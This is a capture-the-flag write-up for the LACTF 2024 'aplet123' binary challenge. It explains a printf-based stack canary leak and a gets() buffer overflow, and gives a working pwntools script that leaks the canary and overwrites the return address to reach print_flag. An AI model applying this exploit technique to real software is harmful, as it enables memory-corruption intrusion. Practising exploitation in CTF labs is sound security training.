# aplet123
## LACTF 2024

This challenge requires you to leak the stack canary and perform a buffer overflow in which you return to the `print_flag` function.

Both vulnerabilities are present within the main function:

![image](https://github.com/paul-m-b/irisctf24sols/assets/29514104/27dd3ac3-a011-4a92-aa38-5fbfc706e1e7)

(`gets(input)` -- buffer overflow, `printf(hi %s, i'm aplet123\n", s + 4);` -- memory leak)

The `printf` statement will leak the stack canary because it will print out memory as a string 4 bytes after wherever `i'm` is found in the string.

This means that, if we align our input so that it (very roughly) looks like this in memory: `[our padding]i'm[canary]` we will leak the canary.

After that, all that's needed is to parse the output and build our payload. The python code below is my solution:

```python
from pwn import *

p = process("./aplet123")

# set up padding to leak the canary
# [padding]i'm
p.sendline(b"A"*69+b"i'm")

data = p.readuntil(", i'm")

#parse and get canary (in string (%s) format)
data = data.replace(b"hello\nhi ",b"")
data = data.replace(b", i'm",b"")[:7]
data = b"\x00"+data

#convert the canary from a string to an int
canary = u64(data)

# address of print_flag function
win = p64(0x00000000004011e6)

#construct and send payload
p.sendline(b"A"*72+p64(canary)+b"A"*8+win)

p.sendline("bye")

p.interactive()
```
